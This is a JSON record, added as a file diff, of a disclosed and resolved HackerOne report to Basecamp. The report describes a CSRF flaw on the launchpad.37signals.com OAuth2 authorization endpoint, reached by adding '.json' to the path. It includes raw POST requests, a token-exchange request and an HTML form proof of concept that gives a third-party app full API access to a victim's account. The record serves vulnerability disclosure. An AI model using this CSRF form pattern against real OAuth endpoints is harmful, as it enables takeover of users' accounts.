@@ -1,0 +1,136 @@
+{
+  "id": 850022,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTAwMjI=",
+  "url": "https://hackerone.com/reports/850022",
+  "title": "CSRF on launchpad.37signals.com OAuth2 authorization endpoint",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-04-14T23:22:27.499Z",
+  "submitted_at": "2020-04-14T23:22:27.499Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "carbon61",
+    "url": "/carbon61",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 67,
+    "url": "https://hackerone.com/basecamp",
+    "handle": "basecamp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Basecamp",
+      "twitter_handle": "basecamp",
+      "website": "https://37signals.com/policies/security/response",
+      "about": "Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Creators of the HEY email service."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-10-30T18:35:11.408Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-10-30T18:35:11.330Z",
+  "team_member_agreed_on_going_public_at": "2020-10-29T20:44:58.337Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\nI found a CSRF in the OAuth2 authorization endpoint on launchpad.37signals.com. That allows a malicious 3rd party application to gain full API access to  victim's  account in 37signals products  that uses OAuth2 authorization.\n\nI found that when making a post request to ``` authorization ```  endpoint it does not check the \"authenticity token\" if you add \" .json or .xml \" like this \"authorization.json\" .\n\n##post request:\n```\nPOST /authorization.json HTTP/1.1\nHost: launchpad.37signals.com\nConnection: close\nContent-Length: 168\nCache-Control: max-age=0\nOrigin: null\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36\nSec-Fetch-Dest: document\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: _beanstalk_uuid=\n\nclient_id={your-client-id}&type=web_server&redirect_uri={your-redirect-uri}&commit=\n\n```\n\n\nAfter a 3rd party application gets the authorization code from redirect_uri, it can then exchange it for an access token. and get full access to the api.\n\n## request to get the access token:\n\n```\nPOST /authorization/token HTTP/1.1\nHost: launchpad.37signals.com\nConnection: close\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36\nSec-Fetch-Dest: document\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: _beanstalk_uuid=\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 214\n\ntype=web_server&client_id={your-client-id}&redirect_uri={your-redirect-uri}&client_secret={your-client-secret}&code={authorization-code}\n\n```\n\n## PoC:\n\n1- you will need to register on the 37Signals Integration Portal.\n\n2- Login to any 37Signals apps that uses the OAuth2 authorization for example basecamp 3 account. (i tested it using basecamp 3 )\n\n3- for testing , submit the following form through the browser in which you are logged in:\n\n```\n<form action=\"https://launchpad.37signals.com/authorization.json\" method=\"POST\">\n      <input type=\"hidden\" name=\"client&#95;id\" value=\"{your-client-id}\" />\n      <input type=\"hidden\" name=\"client&#95;secret\" value=\"\" />\n      <input type=\"hidden\" name=\"type\" value=\"web&#95;server\" />\n      <input type=\"hidden\" name=\"redirect&#95;uri\" value=\"{your-redirect-uri}\" />\n      <input type=\"hidden\" name=\"commit\" value=\"\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n```\n\nyou will get the {authorization-code} so you can exchange it for an access token\n\n## Note that a real attack does not require user interaction.\n\n## Impact\n\nThrough this vulnerability an attacker can do malicious actions on the victim's account\nfull API access to  victim's  account",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2020-11-28T20:44:58.431Z",
+  "allow_singular_disclosure_after": -171743525.0732348,
+  "singular_disclosure_allowed": true,
+  "vote_count": 42,
+  "voters": [
+    "loaymorad",
+    "arist0phanes",
+    "carbon61",
+    "fqdn",
+    "0xfff_",
+    "ivodafon",
+    "ali",
+    "zomasec",
+    "mohaned0101",
+    "akashhamal0x01",
+    "and 32 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.1,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 4656,
+    "asset_type": "URL",
+    "asset_identifier": "launchpad.37signals.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
